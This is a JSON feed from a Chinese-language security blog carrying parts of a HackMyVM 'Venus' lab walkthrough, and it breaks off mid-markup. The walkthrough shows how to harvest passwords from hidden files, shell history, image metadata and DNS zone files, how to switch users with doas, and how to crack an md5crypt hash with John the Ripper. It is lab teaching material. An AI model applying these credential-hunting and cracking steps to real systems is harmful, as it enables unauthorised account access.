{
    "version": "https://jsonfeed.org/version/1",
    "title": "欢迎来到 fo 的网络安全小站",
    "description": "欢迎来到 fo 的网络安全小站",
    "home_page_url": "http://zhyzhyzhy.cn",
    "items": [
        {
            "id": "http://zhyzhyzhy.cn/2022/11/08/hackmyvm-venus-walkthrough-5-5/",
            "url": "http://zhyzhyzhy.cn/2022/11/08/hackmyvm-venus-walkthrough-5-5/",
            "title": "HackMyVM Venus Walkthrough 4/5",
            "date_published": "2022-11-07T20:00:00.000Z",
            "content_html": "<h1 id=\"hackmyvm-venus-walkthrough-55\"><a class=\"anchor\" href=\"#hackmyvm-venus-walkthrough-55\">#</a> HackMyVM Venus Walkthrough 5/5</h1>\n<h2 id=\"0x41\"><a class=\"anchor\" href=\"#0x41\">#</a> 0x41</h2>\n<blockquote>\n<p>Mission: User sarah uses header in <span class=\"exturl\" data-url=\"aHR0cDovL2xvY2FsaG9zdC9rZXkucGhw\">http://localhost/key.php</span></p>\n</blockquote>\n<p>Sarah 使用 headers 与 <span class=\"exturl\" data-url=\"aHR0cDovL2xvY2FsaG9zdC9rZXkucGhw\">http://localhost/key.php</span> 通信<br />\n然后让我们用 curl 调用 URL 来看看会发生什么：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">curl</span> http://localhost/key.php</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Key header is true?</pre></td></tr></table></figure><p>服务器询问我们标头中的 &quot;Key&quot; 字段是否为真。当然，我们的第一个请求并非如此。但是使用选项 -H 我们可以 curl 为调用提供标题。所以让我们设置标题 &quot;Key：true&quot;：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">curl</span> <span class=\"token parameter variable\">-H</span> <span class=\"token string\">\"Key: true\"</span> http://localhost/key.php</pre></td></tr></table></figure><p>现在服务器 返回 0x42 的密码。</p>\n<h2 id=\"0x42\"><a class=\"anchor\" href=\"#0x42\">#</a> 0x42</h2>\n<blockquote>\n<p>Mission: The password of mercy is hidden in this directory.</p>\n</blockquote>\n<p>所以下一级的密码就隐藏在这个目录下。让我们看看我们可以在目录中找到什么：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>la <span class=\"token parameter variable\">-la</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>drwxr-x--- <span class=\"token number\">2</span> root  sarah <span class=\"token number\">4096</span> Apr  <span class=\"token number\">7</span> 06:00 <span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>drwxr-xr-x <span class=\"token number\">1</span> root  root  <span class=\"token number\">4096</span> Apr  <span class=\"token number\">7</span> 05:55 <span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root  sarah   <span class=\"token number\">16</span> Apr  <span class=\"token number\">7</span> 06:00 <span class=\"token punctuation\">..</span>.</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> sarah sarah  <span class=\"token number\">220</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .bash_logout</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> sarah sarah <span class=\"token number\">3526</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .bashrc</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> sarah sarah  <span class=\"token number\">807</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .profile</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root  sarah   <span class=\"token number\">31</span> Apr  <span class=\"token number\">7</span> 05:55 flagz.txt</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root  sarah  <span class=\"token number\">175</span> Apr  <span class=\"token number\">7</span> 05:55 mission.txt</pre></td></tr></table></figure><p>如果不仔细看，很容易错过隐藏文件，但我们作为专业人士当然会立即识别文件 '...'。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span> <span class=\"token punctuation\">..</span>.</pre></td></tr></table></figure><p>有了这个，我们得到了下一个级别的密码。</p>\n<h2 id=\"0x43\"><a class=\"anchor\" href=\"#0x43\">#</a> 0x43</h2>\n<blockquote>\n<p>Mission: User mercy is always wrong with the password of paula.</p>\n</blockquote>\n<p>Mercy 似乎不记得 Paula 的密码了。让我们看看我们可以找到什么样的文件：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ls</span> <span class=\"token parameter variable\">-la</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>drwxr-x--- <span class=\"token number\">2</span> root  mercy <span class=\"token number\">4096</span> Apr  <span class=\"token number\">7</span> 06:00 <span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>drwxr-xr-x <span class=\"token number\">1</span> root  root  <span class=\"token number\">4096</span> Apr  <span class=\"token number\">7</span> 05:55 <span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root  mercy  <span class=\"token number\">133</span> Apr  <span class=\"token number\">7</span> 06:00 .bash_history</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> mercy mercy  <span class=\"token number\">220</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .bash_logout</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> mercy mercy <span class=\"token number\">3526</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .bashrc</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> mercy mercy  <span class=\"token number\">807</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .profile</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root  mercy   <span class=\"token number\">31</span> Apr  <span class=\"token number\">7</span> 05:55 flagz.txt</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root  mercy  <span class=\"token number\">190</span> Apr  <span class=\"token number\">7</span> 05:55 mission.txt</pre></td></tr></table></figure><p>虽然我们没有找到 Mercy 存储 Paula 密码的密码文件，但我们确实找到了其他同样好的东西：文件 '.bash_history'。使用命令  <code>history</code>  ，我们可以显示 Mercy 所做的最后一个命令行条目：</p>\n<pre><code>history\n</code></pre>\n<p>其中输出的一行看起来很像下一级的密码。</p>\n<h2 id=\"0x44\"><a class=\"anchor\" href=\"#0x44\">#</a> 0x44</h2>\n<blockquote>\n<p>Mission: The user karla trusts me, she is part of my group of friends.</p>\n</blockquote>\n<p>karla 在我们的朋友组中。然后让我们看看我们作为 Paula 属于哪些组：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">groups</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>paula hidden</pre></td></tr></table></figure><p>我们属于 'paula' 和 'hidden' 组。在这一点上，'hidden' 组看起来很有希望。然后让我们看看哪些文件被分配到了 'hidden' 组：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">find</span> / <span class=\"token parameter variable\">-group</span> hidden <span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span>/dev/null</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>/usr/src/.karl-a</pre></td></tr></table></figure><p>只能找到对应组的一个文件。让我们看一下这个文件的内容：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span> /usr/src/.karl-a</pre></td></tr></table></figure><p>这看起来很像下一级的密码。</p>\n<h2 id=\"0x45\"><a class=\"anchor\" href=\"#0x45\">#</a> 0x45</h2>\n<blockquote>\n<p>Mission: User denise has saved her password in the image.</p>\n</blockquote>\n<p>denise 在一张图片中保存了下一级的密码。通常，我们要做的第一件事是查看主目录中的文件：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ls</span> <span class=\"token parameter variable\">-la</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>drwxr-x--- <span class=\"token number\">2</span> root  karla  <span class=\"token number\">4096</span> Apr  <span class=\"token number\">7</span> 06:00 <span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>drwxr-xr-x <span class=\"token number\">1</span> root  root   <span class=\"token number\">4096</span> Apr  <span class=\"token number\">7</span> 05:55 <span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> karla karla   <span class=\"token number\">220</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .bash_logout</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> karla karla  <span class=\"token number\">3526</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .bashrc</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> karla karla   <span class=\"token number\">807</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .profile</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root  karla    <span class=\"token number\">31</span> Apr  <span class=\"token number\">7</span> 05:55 flagz.txt</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root  karla   <span class=\"token number\">176</span> Apr  <span class=\"token number\">7</span> 05:55 mission.txt</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root  karla <span class=\"token number\">32946</span> Apr  <span class=\"token number\">7</span> 06:00 yuju.jpg</pre></td></tr></table></figure><p>实际上，有一个名为 &quot;yuju.jpg&quot; 的图像文件。此外，使用检查文件格式 <code>file</code>  确认它是 JPEG 文件：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">file</span> yuju.jpg</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>yuju.jpg: JPEG image data, JFIF standard <span class=\"token number\">1.01</span>, resolution <span class=\"token punctuation\">(</span>DPI<span class=\"token punctuation\">)</span>, density 96x96, segment length <span class=\"token number\">16</span>, Exif Standard: <span class=\"token punctuation\">[</span>TIFF image data, big-endian, <span class=\"token assign-left variable\">direntries</span><span class=\"token operator\">=</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span>, baseline, precision <span class=\"token number\">8</span>, 442x463, components <span class=\"token number\">3</span></pre></td></tr></table></figure><p>现在，在我们假设使用一些奇特的密码隐写技术将密码隐藏在图像文件中之前，让我们看一下图像的 Exif 数据：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>exiftool yuyu.jpg</pre></td></tr></table></figure><p>事实上，我们在 about 标签中发现了一些看起来很像下一级密码的东西。</p>\n<h2 id=\"0x46\"><a class=\"anchor\" href=\"#0x46\">#</a> 0x46</h2>\n<blockquote>\n<p>Mission: The user zora is screaming doas!</p>\n</blockquote>\n<p>如果 Zora 在大声喊 doas，让我们使用它：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>doas</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>usage: doas <span class=\"token punctuation\">[</span>-Lns<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>-C config<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>-u user<span class=\"token punctuation\">]</span> <span class=\"token builtin class-name\">command</span> <span class=\"token punctuation\">[</span>args<span class=\"token punctuation\">]</span></pre></td></tr></table></figure><p>该命令期望执行另一个命令。此外，您可以指定执行命令的用户。因此，如果我们可以使用用户 &quot;zora&quot; 执行 <code>bash</code> ，我们将处于下一个级别：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>doas <span class=\"token parameter variable\">-u</span> zora /bin/bash</pre></td></tr></table></figure><p>现在我们只需要输入我们自己的密码（&quot;denise&quot; 的密码），我们就进入了下一个级别！</p>\n<h2 id=\"0x47\"><a class=\"anchor\" href=\"#0x47\">#</a> 0x47</h2>\n<blockquote>\n<p>Mission: The user belen has left her password in venus.hmv</p>\n</blockquote>\n<p>任务文本表 belen 将密码保存在一个名为 &quot;venus.hmv&quot; 的文件中。<br />\n首先，让我们看看主目录中有什么：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ls</span> <span class=\"token parameter variable\">-la</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>drwxr-x--- <span class=\"token number\">2</span> root zora <span class=\"token number\">4096</span> Apr  <span class=\"token number\">7</span> 06:00 <span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>drwxr-xr-x <span class=\"token number\">1</span> root root <span class=\"token number\">4096</span> Apr  <span class=\"token number\">7</span> 05:55 <span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> zora zora  <span class=\"token number\">220</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .bash_logout</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> zora zora <span class=\"token number\">3526</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .bashrc</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> zora zora  <span class=\"token number\">807</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .profile</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root zora   <span class=\"token number\">31</span> Apr  <span class=\"token number\">7</span> 05:55 flagz.txt</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root zora  <span class=\"token number\">173</span> Apr  <span class=\"token number\">7</span> 05:55 mission.txt</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root zora   <span class=\"token number\">16</span> Apr  <span class=\"token number\">7</span> 06:00 zora_pass.txt</pre></td></tr></table></figure><p>没有名为 &quot;venus.hmv&quot; 的文件。然后我们只搜索文件系统范围：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">find</span> / <span class=\"token parameter variable\">-name</span> venus.hmv <span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span>/dev/null</pre></td></tr></table></figure><p>再次没有成功。该文件似乎不存在。也许 'venus.hmv' 根本不是一个文件，而是一个 URL。这可以很容易地找到 curl：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">curl</span> venus.hmv</pre></td></tr></table></figure><p>事实上，我们得到了下一级的密码作为响应。</p>\n<h2 id=\"0x48\"><a class=\"anchor\" href=\"#0x48\">#</a> 0x48</h2>\n<blockquote>\n<p>Mission: It seems that belen has stolen the password of the user leona…</p>\n</blockquote>\n<p>再次，让我们先看看我们可以在 Belen 的主目录中找到哪些文件：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ls</span> <span class=\"token parameter variable\">-la</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>drwxr-x--- <span class=\"token number\">2</span> root  belen <span class=\"token number\">4096</span> Apr  <span class=\"token number\">7</span> 06:00 <span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>drwxr-xr-x <span class=\"token number\">1</span> root  root  <span class=\"token number\">4096</span> Apr  <span class=\"token number\">7</span> 05:55 <span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> belen belen  <span class=\"token number\">220</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .bash_logout</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> belen belen <span class=\"token number\">3526</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .bashrc</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> belen belen  <span class=\"token number\">807</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .profile</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root  belen   <span class=\"token number\">31</span> Apr  <span class=\"token number\">7</span> 05:55 flagz.txt</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root  belen  <span class=\"token number\">197</span> Apr  <span class=\"token number\">7</span> 05:55 mission.txt</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root  belen   <span class=\"token number\">32</span> Apr  <span class=\"token number\">7</span> 06:00 stolen.txt</pre></td></tr></table></figure><p>这里的文件'stolen.txt' 看起来很有希望。我们来看看内容：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span> stolen.txt</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$1</span><span class=\"token variable\">$leona</span><span class=\"token variable\">$lhWp56YnWAMz6z32Bw53L0</span></pre></td></tr></table></figure><p>字符串开头的字符串 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span></span></span></span> 告诉我们它是  <code>md5crypt</code>  格式。<br />\n让我们将字符串保存到本地文件，让  <code>JohnTheRipper</code>  看看他是否可以找到匹配的明文到哈希：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>john <span class=\"token parameter variable\">--format</span><span class=\"token operator\">=</span>md5crypt <span class=\"token parameter variable\">--wordlist</span><span class=\"token operator\">=</span>/usr/share/wordlists/rockyou.txt stolen.txt</pre></td></tr></table></figure><p>JohnTheRipper 破解了出来，并为我们提供了 0x49 的密码。</p>\n<h2 id=\"0x49\"><a class=\"anchor\" href=\"#0x49\">#</a> 0x49</h2>\n<blockquote>\n<p>Mission: User ava plays a lot with the DNS of venus.hmv lately…</p>\n</blockquote>\n<p>Ava 使用 venus.hmv 的 DNS 记录。然后让我们查看存储本地 DNS 记录的 'bind' 文件夹：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ls</span> <span class=\"token parameter variable\">-la</span> /etc/bind</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>drwxr-sr-x <span class=\"token number\">2</span> root <span class=\"token builtin class-name\">bind</span> <span class=\"token number\">4096</span> Apr  <span class=\"token number\">7</span> 06:00 <span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>drwxr-xr-x <span class=\"token number\">1</span> root root <span class=\"token number\">4096</span> Apr  <span class=\"token number\">8</span> <span class=\"token number\">18</span>:33 <span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> root root <span class=\"token number\">1991</span> Mar <span class=\"token number\">14</span> <span class=\"token number\">14</span>:25 bind.keys</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> root root  <span class=\"token number\">237</span> Mar <span class=\"token number\">14</span> <span class=\"token number\">14</span>:25 db.0</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> root root  <span class=\"token number\">271</span> Mar <span class=\"token number\">14</span> <span class=\"token number\">14</span>:25 db.127</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> root root  <span class=\"token number\">237</span> Mar <span class=\"token number\">14</span> <span class=\"token number\">14</span>:25 db.255</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> root root  <span class=\"token number\">353</span> Mar <span class=\"token number\">14</span> <span class=\"token number\">14</span>:25 db.empty</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> root root  <span class=\"token number\">270</span> Mar <span class=\"token number\">14</span> <span class=\"token number\">14</span>:25 db.local</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> root <span class=\"token builtin class-name\">bind</span>  <span class=\"token number\">613</span> Apr  <span class=\"token number\">7</span> 06:00 db.venus.hmv</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> root <span class=\"token builtin class-name\">bind</span>  <span class=\"token number\">463</span> Mar <span class=\"token number\">14</span> <span class=\"token number\">14</span>:25 named.conf</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> root <span class=\"token builtin class-name\">bind</span>  <span class=\"token number\">498</span> Mar <span class=\"token number\">14</span> <span class=\"token number\">14</span>:25 named.conf.default-zones</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> root <span class=\"token builtin class-name\">bind</span>  <span class=\"token number\">307</span> Apr  <span class=\"token number\">7</span> 06:00 named.conf.local</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> root <span class=\"token builtin class-name\">bind</span>  <span class=\"token number\">219</span> Apr  <span class=\"token number\">7</span> 06:00 named.conf.options</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> <span class=\"token builtin class-name\">bind</span> <span class=\"token builtin class-name\">bind</span>  <span class=\"token number\">100</span> Apr  <span class=\"token number\">7</span> 05:55 rndc.key</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> root root <span class=\"token number\">1317</span> Mar <span class=\"token number\">14</span> <span class=\"token number\">14</span>:25 zones.rfc1918</pre></td></tr></table></figure><p>在这里，文件 &quot;db.venus.hmv&quot; 立即引起了您的注意。如果您仔细查看内容，您会找到下一级的密码。</p>\n<h2 id=\"0x50\"><a class=\"anchor\" href=\"#0x50\">#</a> 0x50</h2>\n<blockquote>\n<p>MIssion: The password of maria is somewhere…</p>\n</blockquote>\n<p>用户 Maria 的密码以及最后一级的密码在某处。任务文本表明我们已经在某个地方使用了 Maria 的密码，这是真的，但与你想象的不同……</p>\n",
            "tags": [
                "Linux",
                "CTF",
                "打靶",
                "hackMyVM"
            ]
        },
        {
            "id": "http://zhyzhyzhy.cn/2022/11/08/hackmyvm-venus-walkthrough-4-5/",
            "url": "http://zhyzhyzhy.cn/2022/11/08/hackmyvm-venus-walkthrough-4-5/",
            "title": "HackMyVM Venus Walkthrough 3/5",
            "date_published": "2022-11-07T19:00:00.000Z",
            "content_html": "<h1 id=\"hackmyvm-venus-walkthrough-45\"><a class=\"anchor\" href=\"#hackmyvm-venus-walkthrough-45\">#</a> HackMyVM Venus Walkthrough 4/5</h1>\n<h2 id=\"0x31\"><a class=\"anchor\" href=\"#0x31\">#</a> 0x31</h2>\n<blockquote>\n<p>Mission: The user veronica visits a lot <span class=\"exturl\" data-url=\"aHR0cDovL2xvY2FsaG9zdC93YWl0aW5nLnBocA==\">http://localhost/waiting.php</span></p>\n</blockquote>\n<p>根据任务文本，Veronica 经常访问 <span class=\"exturl\" data-url=\"aHR0cDovL2xvY2FsaG9zdC93YWl0aW5nLnBocA==\">http://localhost/waiting.php</span> 页面。<br />\n让我们使用命令行工具 &quot;curl&quot; 来看看它背后是什么：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">curl</span> http://localhost/waiting.php</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Im waiting <span class=\"token keyword\">for</span> the user-agent PARADISE.</pre></td></tr></table></figure><p>服务器告诉我们它正在等待带有用户代理字符串 &quot;PARADISE&quot; 的用户。使用参数 -A 我们可以指示 <code>curl</code>  通过请求传递适当的用户代理：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">curl</span> <span class=\"token parameter variable\">-A</span> PARADISE http://localhost/waiting.php</pre></td></tr></table></figure><p>作为响应，服务器现在提供下一级的密码。</p>\n<h2 id=\"0x32\"><a class=\"anchor\" href=\"#0x32\">#</a> 0x32</h2>\n<blockquote>\n<p>Mission: The user veronica uses a lot the password from lana, so she created an alias.</p>\n</blockquote>\n<p>Veronica 经常使用 Lana 的密码，因此她为其创建了一个别名。由于在隐藏文件 '.bashrc' 中创建了一个别名，让我们看看这个文件是否存在：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ls</span> <span class=\"token parameter variable\">-la</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>drwxr-x--- <span class=\"token number\">2</span> root     veronica <span class=\"token number\">4096</span> Apr  <span class=\"token number\">7</span> 05:55 <span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>drwxr-xr-x <span class=\"token number\">1</span> root     root     <span class=\"token number\">4096</span> Apr  <span class=\"token number\">7</span> 05:55 <span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> veronica veronica  <span class=\"token number\">220</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .bash_logout</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> veronica veronica <span class=\"token number\">3559</span> Apr  <span class=\"token number\">7</span> 06:00 .bashrc</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> veronica veronica  <span class=\"token number\">807</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .profile</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root     veronica   <span class=\"token number\">31</span> Apr  <span class=\"token number\">7</span> 05:55 flagz.txt</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root     veronica  <span class=\"token number\">228</span> Apr  <span class=\"token number\">7</span> 05:55 mission.txt</pre></td></tr></table></figure><p>文件 '.bashrc' 存在。现在我们使用  <code>grep</code>  命令搜索此文件中出现的字符串 &quot;lana&quot;：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span> .bashrc <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> lana</pre></td></tr></table></figure><p>这样我们就有了 0x33 的密码。</p>\n<h2 id=\"0x33\"><a class=\"anchor\" href=\"#0x33\">#</a> 0x33</h2>\n<blockquote>\n<p>Mission: The user noa loves to compress her things.</p>\n</blockquote>\n<p>由于 Noa 喜欢压缩她的东西，我们先来看看我们可以找到哪些文件：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>la <span class=\"token parameter variable\">-la</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>drwxr-x--- <span class=\"token number\">2</span> root lana  <span class=\"token number\">4096</span> Apr  <span class=\"token number\">7</span> 06:00 <span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>drwxr-xr-x <span class=\"token number\">1</span> root root  <span class=\"token number\">4096</span> Apr  <span class=\"token 